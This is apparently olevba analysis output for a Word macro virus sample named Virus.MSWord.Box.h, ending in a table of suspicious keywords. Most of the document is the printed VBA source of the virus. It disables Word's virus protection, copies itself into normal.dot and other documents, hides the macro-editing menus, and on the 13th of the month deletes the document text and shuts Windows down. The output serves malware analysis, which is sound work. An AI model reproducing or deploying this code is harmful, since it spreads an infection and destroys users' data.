olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Box.h-1c82896d1b1fa7650cea5e3f1cb24300707d1508
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Box.h-1c82896d1b1fa7650cea5e3f1cb24300707d1508 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: Virus.MSWord.Box.h-1c82896d1b1fa7650cea5e3f1cb24300707d1508 - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoclose()
Attribute autoclose.VB_Description = "巨集建立於 98/03/13，建立者 AAAA"
Attribute autoclose.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoClose"

Dim F$
Dim N$
On Error Resume Next
Options.VirusProtection = False
For ADVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(ADVVC).Name = "autoclose" Then
DocumentInstalled = True
End If
Next
For NTVVC = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(NTVVC).Name = "autoclose" Then
GlobalInstalled = True
End If
Next
If DocumentInstalled = True Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
activedoc.SaveAs FileName:=activedoc.Name, fileformat:=wdFormatTemplate
Options.SavePropertiesPrompt = False
End If
If GlobalInstalled = True Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If

On Error Resume Next
F$ = WordBasic.[FileName$]()
N$ = "normal.dot"
Application.OrganizerCopy Source:=F$, Destination:=N$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](0)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](1)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](2)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](3)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False

WordBasic.filesaveas Format:=1
F$ = WordBasic.[FileName$](4)
Application.OrganizerCopy Source:=N$, Destination:=F$, Name:="autoclose", Object:=wdOrganizerObjectProjectItems
Options.SavePropertiesPrompt = False


If WordBasic.Day(Now()) = 13 Then
joke
End If

exit_:

End Sub
Private Sub joke()
On Error Resume Next

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    WordBasic.docclose 1
    WordBasic.ExitWindows

End Sub
Sub toolsoptions()

Rem
Rem

End Sub
Sub filetemplates()
Rem
Rem
End Sub
Sub toolsmacro()
Rem
Rem

End Sub
Sub viewvbcode()
Rem
Rem
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
